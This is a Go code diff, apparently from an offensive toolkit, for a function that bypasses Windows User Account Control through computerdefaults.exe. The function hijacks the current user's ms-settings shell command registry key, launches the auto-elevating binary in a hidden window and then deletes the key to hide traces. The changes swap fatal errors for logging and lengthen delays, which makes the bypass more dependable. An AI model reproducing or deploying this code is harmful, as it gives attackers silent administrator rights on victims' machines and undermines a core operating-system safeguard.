@@ -39,7 +39,7 @@ func HWND_W32_Method_Computerdefaults(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Load kernel32.dll library ...
@@ -47,13 +47,13 @@ func HWND_W32_Method_Computerdefaults(path string) error {
 
 	kernel32, err := syscall.LoadLibrary("kernel32.dll")
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Get process address "Wow64DisableWow64FsRedirection" from kernel32.dll ...
 	proc32, err := syscall.GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection")
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	_, _, _ = syscall.Syscall(
@@ -68,43 +68,45 @@ func HWND_W32_Method_Computerdefaults(path string) error {
 		registry.QUERY_VALUE|registry.SET_VALUE,
 	)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting DEFAULT key value for the ABSOLUTE program path
 	// +0x23df ...
 
 	if err := wkey32.SetStringValue("", currentDir); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting "DelegateExecure" key value to None
 	// +0x23df ...
 
 	if err := wkey32.SetStringValue("DelegateExecute", ""); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Absolute key function closing
 	// +0x54ef ...
 
 	if err := wkey32.Close(); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
-	// Sleep for 4 seconds ...
-	time.Sleep(4 * 1 * time.Second)
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
 
 	// Execute cmd-like command "start computerdefaults.exe" ...
 	var cmd = exec.Command("cmd", "/C", "start computerdefaults.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err = cmd.Output()
 
-	time.Sleep(4 * 1 * time.Second)
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
+
 	// Absolutly delete registry key "Software\Classes\ms-settings\shell\open\command" ...
 	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	return err
